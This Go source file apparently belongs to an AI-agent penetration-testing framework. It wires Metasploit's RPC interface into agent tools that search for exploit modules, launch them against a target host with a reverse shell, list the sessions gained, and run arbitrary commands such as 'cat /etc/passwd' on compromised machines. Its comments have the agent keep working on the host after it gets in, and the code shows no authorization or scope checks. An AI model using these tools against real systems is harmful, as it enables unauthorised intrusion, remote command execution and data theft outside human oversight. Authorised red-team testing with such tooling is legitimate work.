package scenarios

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/Coff0xc/vero/internal/tools"
)

// ---------- Metasploit RPC 集成 ----------

// MSFClient —— Metasploit RPC 客户端, 通过 msfrpcd 远程调用 Metasploit。
type MSFClient struct {
	baseURL string
	token   string
	client  *http.Client
}

// NewMSFClient —— 创建 MSF RPC 客户端。
// 需要先启动 msfrpcd: msfrpcd -P <password> -S -a 127.0.0.1
func NewMSFClient(baseURL, password string) (*MSFClient, error) {
	client := &http.Client{Timeout: 30 * time.Second}

	// 认证获取 token
	token, err := msfAuth(baseURL, password, client)
	if err != nil {
		return nil, fmt.Errorf("MSF auth failed: %w", err)
	}

	return &MSFClient{
		baseURL: baseURL,
		token:   token,
		client:  client,
	}, nil
}

// msfAuth —— 向 msfrpcd 认证获取 token。
func msfAuth(baseURL, password string, client *http.Client) (string, error) {
	payload := map[string]any{
		"method":  "auth.login",
		"params":  []any{"msf", password},
	}

	resp, err := msfCall(baseURL, "", payload, client)
	if err != nil {
		return "", err
	}

	// 响应格式: {"result": "success", "token": "..."}
	if result, ok := resp["result"].(string); ok && result == "success" {
		if token, ok := resp["token"].(string); ok {
			return token, nil
		}
	}

	return "", fmt.Errorf("auth failed: %v", resp)
}

// msfCall —— 通用 MSF RPC 调用。
func msfCall(baseURL, token string, payload map[string]any, client *http.Client) (map[string]any, error) {
	// 添加 token 到 params (如果有)
	if token != "" {
		if params, ok := payload["params"].([]any); ok {
			payload["params"] = append([]any{token}, params...)
		} else {
			payload["params"] = []any{token}
		}
	}

	body, _ := json.Marshal(payload)
	req, err := http.NewRequest("POST", baseURL+"/api/", bytes.NewReader(body))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/json")

	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	data, _ := io.ReadAll(resp.Body)
	var result map[string]any
	if err := json.Unmarshal(data, &result); err != nil {
		return nil, err
	}

	return result, nil
}

// SearchExploit —— 搜索可用的 exploit 模块 (按 CVE 或关键词)。
func (m *MSFClient) SearchExploit(query string) ([]string, error) {
	payload := map[string]any{
		"method": "module.search",
		"params": []any{query},
	}

	resp, err := msfCall(m.baseURL, m.token, payload, m.client)
	if err != nil {
		return nil, err
	}

	// 响应格式: {"modules": ["exploit/linux/http/...", ...]}
	if modules, ok := resp["modules"].([]any); ok {
		var exploits []string
		for _, mod := range modules {
			if name, ok := mod.(string); ok && strings.HasPrefix(name, "exploit/") {
				exploits = append(exploits, name)
			}
		}
		return exploits, nil
	}

	return nil, nil
}

// ExecuteExploit —— 执行指定 exploit 模块。
func (m *MSFClient) ExecuteExploit(module string, opts map[string]any) (string, error) {
	// 1. 获取模块信息 (验证参数)
	payload := map[string]any{
		"method": "module.options",
		"params": []any{"exploit", module},
	}

	_, err := msfCall(m.baseURL, m.token, payload, m.client)
	if err != nil {
		return "", fmt.Errorf("module not found: %w", err)
	}

	// 2. 执行 exploit
	execPayload := map[string]any{
		"method": "module.execute",
		"params": []any{"exploit", module, opts},
	}

	resp, err := msfCall(m.baseURL, m.token, execPayload, m.client)
	if err != nil {
		return "", err
	}

	// 响应格式: {"job_id": "1", "uuid": "..."}
	if jobID, ok := resp["job_id"].(string); ok {
		return jobID, nil
	}

	return "", fmt.Errorf("execute failed: %v", resp)
}

// GetSessions —— 获取当前活跃 session 列表。
func (m *MSFClient) GetSessions() ([]map[string]any, error) {
	payload := map[string]any{
		"method": "session.list",
		"params": []any{},
	}

	resp, err := msfCall(m.baseURL, m.token, payload, m.client)
	if err != nil {
		return nil, err
	}

	// 响应格式: {"1": {"type": "shell", "tunnel_peer": "...", ...}, ...}
	sessions := []map[string]any{}
	for key, val := range resp {
		if key == "error" || key == "error_message" {
			continue
		}
		if sess, ok := val.(map[string]any); ok {
			sess["id"] = key
			sessions = append(sessions, sess)
		}
	}

	return sessions, nil
}

// rpcFailed —— msfrpcd 业务层失败(HTTP 200 但 result=failure / error=true)。
func rpcFailed(resp map[string]any) bool {
	if e, ok := resp["error"].(bool); ok && e {
		return true
	}
	if r, ok := resp["result"].(string); ok && r == "failure" {
		return true
	}
	return false
}

// call —— 带 token 的 RPC 调用便捷封装。
func (m *MSFClient) call(method string, params []any) (map[string]any, error) {
	return msfCall(m.baseURL, m.token, map[string]any{"method": method, "params": params}, m.client)
}

// SessionCmd —— 在活跃 session 上执行命令并回收输出(抄 Mythic 的 session/tasking 模型:
// 打点拿到 session 后, 智能体可以在失陷主机上持续 tasking, 而不是"证明能进"就停)。
// shell 与 meterpreter 双协议: 先 shell_write/read, 业务层失败回退 meterpreter_write/read。
func (m *MSFClient) SessionCmd(sessionID, cmd string) (string, error) {
	readMethod := "session.shell_read"
	resp, err := m.call("session.shell_write", []any{sessionID, cmd + "\n"})
	if err != nil || rpcFailed(resp) {
		resp2, err2 := m.call("session.meterpreter_write", []any{sessionID, cmd})
		if err2 != nil || rpcFailed(resp2) {
			return "", fmt.Errorf("session 命令写入失败(shell: %v/%v, meterpreter: %v/%v)", err, resp, err2, resp2)
		}
		readMethod = "session.meterpreter_read"
	}
	// 轮询收输出: 连续静默 3 次视为命令执行完毕(避免固定长等待拖慢战役)。
	time.Sleep(2 * time.Second)
	var out strings.Builder
	silent := 0
	for i := 0; i < 10 && silent < 3; i++ {
		r, err := m.call(readMethod, []any{sessionID})
		if err != nil || rpcFailed(r) {
			break
		}
		data, _ := r["data"].(string)
		if data == "" {
			silent++
		} else {
			silent = 0
			out.WriteString(data)
		}
		time.Sleep(1500 * time.Millisecond)
	}
	return out.String(), nil
}

// msfPassword —— 读取 MSF RPC 密码: 环境变量 VERO_MSF_PASSWORD 优先(REDCELL_MSF_PASSWORD 兼容),
// 无则用显式参数。修原版硬编码默认 "msf" 弱口令: 未配置时明确报错, 拒绝静默用弱口令。
func msfPassword(args map[string]any) string {
	if p := os.Getenv("VERO_MSF_PASSWORD"); p != "" {
		return p
	}
	if p := os.Getenv("REDCELL_MSF_PASSWORD"); p != "" {
		return p
	}
	return tools.ArgStr(args, "msf_password", "")
}

// ---------- 工具适配器 ----------

// msfSearchExploit —— 工具: 搜索 Metasploit exploit (按 CVE/关键词)。
func msfSearchExploit(args map[string]any) tools.ToolResult {
	query := tools.ArgStr(args, "query", "")
	if query == "" {
		return tools.ToolResult{Success: false, Stderr: "msf_search: 缺 query", RC: -1}
	}

	baseURL := tools.ArgStr(args, "msf_url", "http://127.0.0.1:55553")
	password := msfPassword(args)
	if password == "" {
		return tools.ToolResult{Success: false, Stderr: "msf_search: 未配置密码, 请设置环境变量 VERO_MSF_PASSWORD", RC: -1}
	}

	client, err := NewMSFClient(baseURL, password)
	if err != nil {
		return tools.ToolResult{Success: false, Stderr: err.Error(), RC: -1}
	}

	exploits, err := client.SearchExploit(query)
	if err != nil {
		return tools.ToolResult{Success: false, Stderr: err.Error(), RC: -1}
	}

	if len(exploits) == 0 {
		return tools.ToolResult{Success: true, Stdout: fmt.Sprintf("No exploits found for: %s", query)}
	}

	stdout := fmt.Sprintf("Found %d exploits for '%s':\n", len(exploits), query)
	for _, exp := range exploits {
		stdout += "  " + exp + "\n"
	}

	return tools.ToolResult{Success: true, Stdout: stdout}
}

// msfExecuteExploit —— 工具: 执行 Metasploit exploit。
func msfExecuteExploit(args map[string]any) tools.ToolResult {
	module := tools.ArgStr(args, "module", "")
	rhost := tools.ArgStr(args, "rhost", "")

	if module == "" || rhost == "" {
		return tools.ToolResult{Success: false, Stderr: "msf_execute: 缺 module 或 rhost", RC: -1}
	}

	baseURL := tools.ArgStr(args, "msf_url", "http://127.0.0.1:55553")
	password := msfPassword(args)
	if password == "" {
		return tools.ToolResult{Success: false, Stderr: "msf_execute: 未配置密码, 请设置环境变量 VERO_MSF_PASSWORD", RC: -1}
	}

	client, err := NewMSFClient(baseURL, password)
	if err != nil {
		return tools.ToolResult{Success: false, Stderr: err.Error(), RC: -1}
	}

	// 构建 exploit 选项
	opts := map[string]any{
		"RHOST": rhost,
		"LHOST": tools.ArgStr(args, "lhost", "127.0.0.1"),
		"LPORT": tools.ArgStr(args, "lport", "4444"),
	}

	// 添加额外参数
	if rport := tools.ArgStr(args, "rport", ""); rport != "" {
		opts["RPORT"] = rport
	}

	jobID, err := client.ExecuteExploit(module, opts)
	if err != nil {
		return tools.ToolResult{Success: false, Stderr: err.Error(), RC: -1}
	}

	stdout := fmt.Sprintf("Exploit %s launched (job_id: %s)\nTarget: %s\nWaiting for session...", module, jobID, rhost)
	return tools.ToolResult{Success: true, Stdout: stdout}
}

// msfGetSessions —— 工具: 列出当前 Metasploit sessions。
func msfGetSessions(args map[string]any) tools.ToolResult {
	baseURL := tools.ArgStr(args, "msf_url", "http://127.0.0.1:55553")
	password := msfPassword(args)
	if password == "" {
		return tools.ToolResult{Success: false, Stderr: "msf_get_sessions: 未配置密码, 请设置环境变量 VERO_MSF_PASSWORD", RC: -1}
	}

	client, err := NewMSFClient(baseURL, password)
	if err != nil {
		return tools.ToolResult{Success: false, Stderr: err.Error(), RC: -1}
	}

	sessions, err := client.GetSessions()
	if err != nil {
		return tools.ToolResult{Success: false, Stderr: err.Error(), RC: -1}
	}

	if len(sessions) == 0 {
		// 目标语义化: "拿到 session"这个目标未达成即失败(与 exploit_sqli 的 token 校验同构),
		// 否则内核 produces 机制会把空列表误建成 foothold 节点(证据造假)。
		return tools.ToolResult{Success: false, Stdout: "No active sessions",
			Stderr: "尚无活跃 session — exploit 可能未成功; 检查 msf_execute 结果或换模块重试", RC: 0}
	}

	stdout := fmt.Sprintf("Active sessions (%d):\n", len(sessions))
	for _, sess := range sessions {
		stdout += fmt.Sprintf("  [%v] %v @ %v\n", sess["id"], sess["type"], sess["tunnel_peer"])
	}

	return tools.ToolResult{Success: true, Stdout: stdout}
}

// msfSessionCmd —— 工具: 在失陷主机 session 上执行任意命令(后渗透闭环核心)。
// session_id 为空自动取最新活跃 session; 输出为空视为失败(session 断开/命令未执行),
// 成功即"真实 shell 访问" —— Produces=shell, 攻击链推进到终点。
func msfSessionCmd(args map[string]any) tools.ToolResult {
	cmd := tools.ArgStr(args, "cmd", "")
	if cmd == "" {
		return tools.ToolResult{Success: false, Stderr: "msf_session_cmd: 缺 cmd", RC: -1}
	}
	baseURL := tools.ArgStr(args, "msf_url", "http://127.0.0.1:55553")
	password := msfPassword(args)
	if password == "" {
		return tools.ToolResult{Success: false, Stderr: "msf_session_cmd: 未配置密码, 请设置环境变量 VERO_MSF_PASSWORD", RC: -1}
	}
	client, err := NewMSFClient(baseURL, password)
	if err != nil {
		return tools.ToolResult{Success: false, Stderr: err.Error(), RC: -1}
	}

	sid := tools.ArgStr(args, "session_id", "")
	if sid == "" { // 未指定 -> 自动取最新活跃 session(Mythic tasking 的默认行为)
		sessions, err := client.GetSessions()
		if err != nil {
			return tools.ToolResult{Success: false, Stderr: err.Error(), RC: -1}
		}
		if len(sessions) == 0 {
			return tools.ToolResult{Success: false, Stderr: "无活跃 session — 先用 msf_execute 打点, 再 msf_get_sessions 确认", RC: -1}
		}
		sid = fmt.Sprint(sessions[len(sessions)-1]["id"])
	}

	out, err := client.SessionCmd(sid, cmd)
	if err != nil {
		return tools.ToolResult{Success: false, Stderr: err.Error(), RC: -1}
	}
	if strings.TrimSpace(out) == "" {
		return tools.ToolResult{Success: false, Stderr: "session 无输出(命令未执行或 session 已断开), 用 msf_get_sessions 复查", RC: 0}
	}
	return tools.ToolResult{Success: true, Stdout: fmt.Sprintf("[session %s] $ %s\n%s", sid, cmd, out)}
}

// ---------- Parser ----------

// ParseMSFSearch —— 解析 msf_search 输出, 提取可用 exploit。
func ParseMSFSearch(stdout string, args map[string]any) []tools.Observation {
	query := tools.ArgStr(args, "query", "?")
	var obs []tools.Observation

	lines := strings.Split(stdout, "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "exploit/") {
			obs = append(obs, tools.Observation{
				Kind:    "finding",
				Key:     query + ":exploit:" + line,
				Label:   fmt.Sprintf("[info] Available exploit: %s", line),
				Excerpt: line,
			})
		}
	}

	return obs
}

// ParseMSFExecute —— 解析 msf_execute 输出, 提取 shell/session。
func ParseMSFExecute(stdout string, args map[string]any) []tools.Observation {
	target := tools.ArgStr(args, "rhost", "?")

	// 如果输出含 "job_id", 说明 exploit 已启动
	if strings.Contains(stdout, "job_id") {
		return []tools.Observation{{
			Kind:      "finding",
			Key:       target + ":exploit_launched",
			Label:     "[high] Exploit launched successfully",
			Excerpt:   "job_id:",
			Technique: "T1021.002", // SMB/Windows 管理共享(横向移动到据点)
			Tactic:    "lateral-movement",
		}}
	}

	return nil
}

// ParseMSFSessions —— 解析 msf_get_sessions 输出, 提取 shell。
func ParseMSFSessions(stdout string, args map[string]any) []tools.Observation {
	var obs []tools.Observation

	lines := strings.Split(stdout, "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		// 匹配: [1] shell @ 192.168.1.100:4444
		if strings.HasPrefix(line, "[") && strings.Contains(line, "@") {
			obs = append(obs, tools.Observation{
				Kind:      "shell",
				Key:       "shell:" + line,
				Label:     fmt.Sprintf("[critical] Active shell: %s", line),
				Excerpt:   line,
				Technique: "T1021.002", // SMB/Windows 管理共享(横向移动建立据点)
				Tactic:    "lateral-movement",
			})
		}
	}

	return obs
}

// ExploitPack —— 漏洞利用场景包: Metasploit 自动化。
func ExploitPack() Pack {
	return Pack{
		Name: "exploit",
		Tools: []*tools.Tool{
			{Name: "msf_search", Level: tools.LevelRecon,
				Desc: "Metasploit exploit 搜索, 按 CVE/关键词查找可用模块, 需 msfrpcd 运行",
				Run: msfSearchExploit, Parse: ParseMSFSearch,
				Args: []tools.ArgSpec{{Name: "query", Desc: "CVE 号或关键词, 如 CVE-2021-44228 / tomcat", Required: true}}},
			{Name: "msf_execute", Level: tools.LevelExploit,
				Desc: "Metasploit exploit 执行, 返回 job_id; 打点后须用 msf_get_sessions 确认 session",
				Run: msfExecuteExploit, Parse: ParseMSFExecute,
				Args: []tools.ArgSpec{
					{Name: "module", Desc: "exploit 模块路径, 如 exploit/multi/http/tomcat_mgr_upload", Required: true},
					{Name: "rhost", Desc: "目标主机/IP", Required: true},
					{Name: "lhost", Desc: "回连主机(本机), 默认 127.0.0.1"},
					{Name: "rport", Desc: "目标端口, 可选"},
				}},
			{Name: "msf_get_sessions", Level: tools.LevelRecon,
				Desc: "Metasploit session 列表; 有活跃 session 才算打点成功(foothold), 空列表判失败",
				Run: msfGetSessions, Parse: ParseMSFSessions, Produces: "foothold",
				Args: []tools.ArgSpec{{Name: "target", Desc: "受影响主机(攻击链挂接用), 可选"}}},
			{Name: "msf_session_cmd", Level: tools.LevelExploit,
				Desc: "后渗透核心: 在失陷主机 session 上执行任意 shell 命令(whoami/ipconfig/读文件/收集信息), 需已有活跃 session; 成功即真实 shell",
				Run: msfSessionCmd, Produces: "shell",
				Args: []tools.ArgSpec{
					{Name: "cmd", Desc: "在失陷主机执行的命令, 如 whoami / ipconfig / cat /etc/passwd", Required: true},
					{Name: "session_id", Desc: "MSF session 编号; 省略自动取最新活跃 session"},
				}},
		},
		Fingerprint: func(s map[string]bool) bool {
			// 当发现漏洞 finding 时激活
			return s["finding"] || s["vulnerability"]
		},
	}
}
